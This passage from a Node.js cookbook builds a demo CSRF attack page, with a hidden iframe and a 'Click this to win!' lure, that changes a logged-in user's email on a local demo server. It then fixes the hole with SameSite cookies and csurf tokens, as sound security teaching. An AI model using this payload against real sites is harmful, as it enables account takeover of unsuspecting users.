    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1980.1">
      like so:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1981.1">
      Start
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1982.1">
       the server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1983.1">$ node server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1984.1">Server listening on port 3000</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1985.1">
      Navigate to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1986.1">
       http://localhost:3000
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1987.1">
      in your browser and expect to see the following HTML login form.
     </span>
     <span class="koboSpan" id="kobo.1987.2">
      Enter
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1988.1">
       beth
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1989.1">
      as the username and
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1990.1">
       badpassword
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1991.1">
      as the password.
     </span>
     <span class="koboSpan" id="kobo.1991.2">
      Then,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1992.1">
       click
      </span>
     </span>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.1993.1">
        Submit
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1994.1">
       :
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer047">
     <span class="koboSpan" id="kobo.1995.1">
      <img alt="Figure 9.9 – Social Media Account – Login" src="image/B19212_09_09.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.1996.1">
     Figure 9.9 – Social Media Account – Login
    </span>
   </p>
   <ol>
    <li value="3">
     <span class="koboSpan" id="kobo.1997.1">
      Once logged
     </span>
     <a id="_idIndexMarker770">
     </a>
     <span class="koboSpan" id="kobo.1998.1">
      in, you should be taken to the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1999.1">
       Settings
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2000.1">
      page of the demo social media profile.
     </span>
     <span class="koboSpan" id="kobo.2000.2">
      Notice that there’s a single field to update your email.
     </span>
     <span class="koboSpan" id="kobo.2000.3">
      Try updating the email to something else.
     </span>
     <span class="koboSpan" id="kobo.2000.4">
      You should see that the update is reflected after
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2001.1">
       clicking
      </span>
     </span>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.2002.1">
        Update
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2003.1">
       :
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer048">
     <span class="koboSpan" id="kobo.2004.1">
      <img alt="Figure 9.10 – Social Media Account – Settings" src="image/B19212_09_10.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.2005.1">
     Figure 9.10 – Social Media Account – Settings
    </span>
   </p>
   <ol>
    <li value="4">
     <span class="koboSpan" id="kobo.2006.1">
      Now, we’re going to create our malicious web page.
     </span>
     <span class="koboSpan" id="kobo.2006.2">
      Create a file named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2007.1">
       csrf-server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2008.1">
      .
     </span>
     <span class="koboSpan" id="kobo.2008.2">
      This is where we’ll build our malicious
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2009.1">
       web page:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.2010.1">$ touch csrf-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2011.1">
      Add the following
     </span>
     <a id="_idIndexMarker771">
     </a>
     <span class="koboSpan" id="kobo.2012.1">
      code to create the malicious
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2013.1">
       web page:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.2014.1">
const http = require('node:http');
const attackerEmail = 'attacker@example.com';
const server = http.createServer((req, res) =&gt; {
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(`
&lt;iframe name=hide style="position:absolute;left:-
  1000px"&gt;&lt;/iframe&gt;
&lt;form method="post"
  action="http://localhost:3000/update" target=hide&gt;
&lt;input type=hidden name=email
  value="${attackerEmail}"&gt;
&lt;input type=submit value="Click this to win!"&gt;
&lt;/form&gt;`);
});
server.listen(3001, () =&gt; {
  console.log('Server listening on port 3001');
});</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2015.1">
      In a second
     </span>
     <a id="_idIndexMarker772">
     </a>
     <span class="koboSpan" id="kobo.2016.1">
      terminal window, start the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2017.1">
        csrf-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2018.1">
       server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.2019.1">$ node csrf-server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.2020.1">Server listening on port 3001</span></strong></pre>
    </li>
   </ol>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.2021.1">
     Important note
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.2022.1">
     In a real CSRF attack, we’d expect the attack to come from a different domain to the vulnerable server.
    </span>
    <span class="koboSpan" id="kobo.2022.2">
     However, due to advances in web browser security, many CSRF attacks are prevented by the browser.
    </span>
    <span class="koboSpan" id="kobo.2022.3">
     For this recipe, we’ll demonstrate the attack on the same domain.
    </span>
    <span class="koboSpan" id="kobo.2022.4">
     Note that CSRF attacks are still possible today, particularly as many users may be using older browsers that don’t have the latest security features to protect against
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2023.1">
      CSRF attacks.
     </span>
    </span>
   </p>
   <ol>
    <li value="7">
     <span class="koboSpan" id="kobo.2024.1">
      Navigate to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2025.1">
       http://localhost:3001
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2026.1">
      in your browser.
     </span>
     <span class="koboSpan" id="kobo.2026.2">
      Expect to see the following output showing a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2027.1">
       single button:
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer049">
     <span class="koboSpan" id="kobo.2028.1">
      <img alt="Figure 9.11 – Malicious CSRF web page showing a suspicious “Click this to win!” button" src="image/B19212_09_11.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.2029.1">
     Figure 9.11 – Malicious CSRF web page showing a suspicious “Click this to win!”
    </span>
    <span class="koboSpan" id="kobo.2029.2">
     button
    </span>
   </p>
   <ol>
    <li value="8">
     <span class="koboSpan" id="kobo.2030.1">
      Click the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.2031.1">
       Click this to win!
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2032.1">
      button.
     </span>
     <span class="koboSpan" id="kobo.2032.2">
      By clicking the button, an HTTP
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2033.1">
       POST
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2034.1">
      request is sent to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2035.1">
       http://localhost:3000/update
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2036.1">
      , with a body containing the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2037.1">
       attacker@example.com
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2038.1">
      email.
     </span>
     <span class="koboSpan" id="kobo.2038.2">
      By clicking this button, the HTTP
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2039.1">
       POST
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2040.1">
      request
     </span>
     <a id="_idIndexMarker773">
     </a>
     <span class="koboSpan" id="kobo.2041.1">
      has been sent to the real website’s server, leveraging the cookie stored in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2042.1">
       the browser.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2043.1">
      Go back to the social media profile page and refresh it.
     </span>
     <span class="koboSpan" id="kobo.2043.2">
      We’ll see that the attacker has managed to update the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2044.1">
       email address:
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer050">
     <span class="koboSpan" id="kobo.2045.1">
      <img alt="Figure 9.12 – The Social Media Account – Settings page showing that the email has been updated to attacker@example.com" src="image/B19212_09_12.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.2046.1">
     Figure 9.12 – The Social Media Account – Settings page showing that the email has been updated to attacker@example.com
    </span>
   </p>
   <ol>
    <li value="10">
     <span class="koboSpan" id="kobo.2047.1">
      Now, let’s fix the server so that it isn’t susceptible to CSRF attacks.
     </span>
     <span class="koboSpan" id="kobo.2047.2">
      First, copy the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2048.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2049.1">
      file to a file
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2050.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2051.1">
        fixed-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2052.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.2053.1">$ cp server.js fixed-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2054.1">
      To fix the server, we
     </span>
     <a id="_idIndexMarker774">
     </a>
     <span class="koboSpan" id="kobo.2055.1">
      need to add some additional configuration to the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2056.1">
       express-session
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2057.1">
      middleware.
     </span>
     <span class="koboSpan" id="kobo.2057.2">
      Change the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2058.1">
       express-session
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2059.1">
      configuration to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2060.1">
       the following:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.2061.1">
app.use(
  session({
    secret: 'Node Cookbook',
    name: 'SESSIONID',
    resave: false,
    saveUninitialized: false,
    cookie: { sameSite: true }
  })
);</span></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.2062.1">
       Note the addition of the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2063.1">
        { cookie : { sameSite : true }}
       </span>
      </strong>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.2064.1">
        configuration.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2065.1">
      Now, having stopped the original server,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2066.1">
       start
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2067.1">
        fixed-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2068.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.2069.1">
$ node fixed-server.js
Server listening on port 3000</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2070.1">
      Return to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2071.1">
       http://localhost:3000
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2072.1">
      and log in again with the same credentials as before.
     </span>
     <span class="koboSpan" id="kobo.2072.2">
      Then, in a second browser tab, visit
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2073.1">
       http://127.0.0.1:3001
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2074.1">
      (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2075.1">
       csrf-server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2076.1">
      should still be running) and click the
     </span>
     <a id="_idIndexMarker775">
     </a>
     <span class="koboSpan" id="kobo.2077.1">
      button again.
     </span>
     <span class="koboSpan" id="kobo.2077.2">
      Note that you must navigate using
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2078.1">
       http://127.0.0.1:3001
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2079.1">
      rather than
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2080.1">
       http://localhost:3001
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2081.1">
      ; otherwise, the request will be considered as coming from the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2082.1">
       same domain.
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.2083.1">
       You’ll find that this time, clicking the button will not update the email on the
      </span>
      <strong class="bold">
       <span class="koboSpan" id="kobo.2084.1">
        Social Media Account - Settings
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2085.1">
       page.
      </span>
      <span class="koboSpan" id="kobo.2085.2">
       If we open
      </span>
      <strong class="bold">
       <span class="koboSpan" id="kobo.2086.1">
        Chrome DevTools
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2087.1">
       |
      </span>
      <strong class="bold">
       <span class="koboSpan" id="kobo.2088.1">
        Console
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2089.1">
       , we’ll even see a
      </span>
      <strong class="bold">
       <span class="koboSpan" id="kobo.2090.1">
        403 (Forbidden)
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2091.1">
       error, confirming that our change has prevented
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.2092.1">
        the attack:
       </span>
      </span>
     </p>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer051">
     <span class="koboSpan" id="kobo.2093.1">
      <img alt="Figure 9.13 – The Chrome DevTools window showing 403 (Forbidden) on our CSRF request" src="image/B19212_09_13.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.2094.1">
     Figure 9.13 – The Chrome DevTools window showing 403 (Forbidden) on our CSRF request
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.2095.1">
     This recipe has demonstrated a simple CSRF attack and the associated risks.
    </span>
    <span class="koboSpan" id="kobo.2095.2">
     We mitigated the vulnerability
    </span>
    <a id="_idIndexMarker776">
    </a>
    <span class="koboSpan" id="kobo.2096.1">
     by supplying additional configuration using the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2097.1">
       express-session
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2098.1">
      middleware.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-308">
    <a id="_idTextAnchor315">
    </a>
    <span class="koboSpan" id="kobo.2099.1">
     How it works…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.2100.1">
     In this recipe, we demonstrated a simple CSRF attack.
    </span>
    <span class="koboSpan" id="kobo.2100.2">
     The attacker crafted a malicious site to leverage a cookie from a social media website to update a user’s email to their own.
    </span>
    <span class="koboSpan" id="kobo.2100.3">
     This is a dangerous vulnerability as once an attacker has updated the email to their own, they can end up with control over
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2101.1">
      the account.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.2102.1">
     To mitigate this vulnerability, we passed the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2103.1">
      express-session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2104.1">
     middleware the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2105.1">
      { cookie : { sameSite : true }}
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2106.1">
     configuration.
    </span>
    <span class="koboSpan" id="kobo.2106.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2107.1">
      SameSite
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2108.1">
     attribute of the cookie header can be set to the following
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2109.1">
      three values:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2110.1">
       none
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2111.1">
      : The cookie can be shared and sent in all contexts, including
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2112.1">
       cross-origin requests
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2113.1">
       lax
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2114.1">
      : This allows the cookie to be shared with HTTP
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2115.1">
       GET
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2116.1">
      requests initiated by third-party websites, but only when it results in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2117.1">
       top-level navigation
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2118.1">
       strict
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2119.1">
      : Cookies can only be sent through a request in a first-party context – if the cookie matches the current
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2120.1">
       site URL
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.2121.1">
     Setting the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2122.1">
      { sameSite : true }
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2123.1">
     configuration option in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2124.1">
      express-session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2125.1">
     middleware configuration equates to setting the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2126.1">
      Set-Cookie : SameSite
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2127.1">
     attribute to
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2128.1">
       strict
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2129.1">
      mode.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.2130.1">
     Inspecting the header of the request in this recipe would show a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2131.1">
      Set-Cookie
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2132.1">
     header similar to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2133.1">
      the
     </span>
    </span>
    <span class="No-Break">
     <a id="_idIndexMarker777">
     </a>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2134.1">
      following:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.2135.1">
Set-Cookie:
SESSIONID=s%3AglL_...gIvei%2BEs; Path=/; HttpOnly; SameSite=Strict</span></pre>
   <h2 id="_idParaDest-309">
    <a id="_idTextAnchor316">
    </a>
    <span class="koboSpan" id="kobo.2136.1">
     There’s more…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.2137.1">
     Some older browsers don’t support the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2138.1">
      Set-Cookie SameSite
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2139.1">
     header attribute.
    </span>
    <span class="koboSpan" id="kobo.2139.2">
     A strategy for dealing with these cases is to generate an anti-CSRF token.
    </span>
    <span class="koboSpan" id="kobo.2139.3">
     These anti-CSRF tokens are stored in the user session, which means the attacker would need access to the session itself to carry out
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2140.1">
      the attack.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.2141.1">
     We can use a module named
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2142.1">
      csurf
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2143.1">
     to help implement
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2144.1">
      anti-CSRF tokens:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.2145.1">
      Still in the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2146.1">
       express-csrf
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2147.1">
      directory, copy
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2148.1">
       fixed-server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2149.1">
      to a new file
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2150.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2151.1">
        csurf-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2152.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.2153.1">$ cp fixed-server.js csurf-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2154.1">
      Install the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2155.1">
        csurf
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2156.1">
       module:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.2157.1">$ npm install csurf</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2158.1">
      Next, we need to import and initialize the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2159.1">
       csurf
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2160.1">
      module in the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2161.1">
       csruf-server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2162.1">
      file.
     </span>
     <span class="koboSpan" id="kobo.2162.2">
      Add the following lines below the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2163.1">
        express-session
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2164.1">
       import:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.2165.1">
const csurf = require('csurf');
const csrf = csurf();</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2166.1">
      Then, we need to alter the HTTP
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2167.1">
       GET
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2168.1">
      request handler so that it uses the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2169.1">
       csrf
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2170.1">
      middleware.
     </span>
     <span class="koboSpan" id="kobo.2170.2">
      We can achieve this by supplying it as the second parameter to the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2171.1">
       get()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2172.1">
      method of the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2173.1">
       /account
      </span>
     </strong>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2174.1">
       route handler:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.2175.1">
app.get('/account', csrf, (req, res) =&gt; {
  if (!req.session.user) return res.redirect('/');
  res.send(`
      &lt;h1&gt;Social Media Account - Settings&lt;/h1&gt;
      &lt;p&gt; Email: ${mockUser.email} &lt;/p&gt;
      &lt;form method="POST" action=/update&gt;
</span><strong class="bold"><span class="koboSpan" id="kobo.2176.1">        &lt;input type=hidden name=_csrf</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.2177.1">          value="${req.csrfToken()}"&gt;</span></strong><span class="koboSpan" id="kobo.2178.1">
        &lt;input name=email value="${mockUser.email}"&gt;
        &lt;input type=submit value=Update &gt;
      &lt;/form&gt;
    `);
});</span></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.2179.1">
       In the HTML
      </span>
      <a id="_idIndexMarker778">
      </a>
      <span class="koboSpan" id="kobo.2180.1">
       template, we generate and inject
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2181.1">
        csrfToken
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2182.1">
       using the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2183.1">
        req.csrfToken()
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2184.1">
       method of the request object.
      </span>
      <span class="koboSpan" id="kobo.2184.2">
       We inject the token into the HTML template as a hidden field named
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2185.1">
        _csrf
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2186.1">
       .
      </span>
      <span class="koboSpan" id="kobo.2186.2">
       The
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2187.1">
        csrf
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2188.1">
       middleware looks for a token with
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.2189.1">
        that name.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2190.1">
      We also need to update the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2191.1">
       post()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2192.1">
      method of our
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2193.1">
       /update
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2194.1">
      route handler so that it can use the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2195.1">
        csrf
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2196.1">
       middleware:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.2197.1">
app.post('/update', </span><strong class="bold"><span class="koboSpan" id="kobo.2198.1">csrf</span></strong><span class="koboSpan" id="kobo.2199.1">, (req, res) =&gt; {
  if (!req.session.user) return res.sendStatus(403);
  mockUser.email = req.body.email;
  res.redirect('/');
});</span></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.2200.1">
       Upon an HTTP
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2201.1">
        POST
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2202.1">
       request, the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2203.1">
        csrf
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2204.1">
       middleware will check the body of a request for the token stored in the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2205.1">
        _csrf
       </span>
      </strong>
      <span class="koboSpan" id="kobo.2206.1">
       field.
      </span>
      <span class="koboSpan" id="kobo.2206.2">
       The middleware then validates the supplied token with the token stored in the
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.2207.1">
        user’s session.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2208.1">
      Start
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2209.1">
       the server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.2210.1">$ node csurf-server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.2211.1">Server listening on port 3000</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2212.1">
      Navigate to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2213.1">
       http://localhost:3000
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2214.1">
      and log in with the same username and password that we used in this recipe.
     </span>
     <span class="koboSpan" id="kobo.2214.2">
      Click on
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.2215.1">
       View Page Source
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2216.1">
      on the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.2217.1">
       Social Media Account - Settings
      </span>
     </strong>
     <span class="koboSpan" id="kobo.2218.1">
      page.
     </span>
     <span class="koboSpan" id="kobo.2218.2">
      You should see the following HTML showing the
     </span>
     <a id="_idIndexMarker779">
     </a>
     <span class="koboSpan" id="kobo.2219.1">
      hidden
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.2220.1">
        _csrf
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2221.1">
       field:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.2222.1">
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Social Media Account - Settings&lt;/h1&gt;
      &lt;p&gt; Email: beth@example.com &lt;/p&gt;
      &lt;form method="POST" action="/update"&gt;
        </span><strong class="bold"><span class="koboSpan" id="kobo.2223.1">&lt;input type="hidden" name="_csrf"</span></strong>
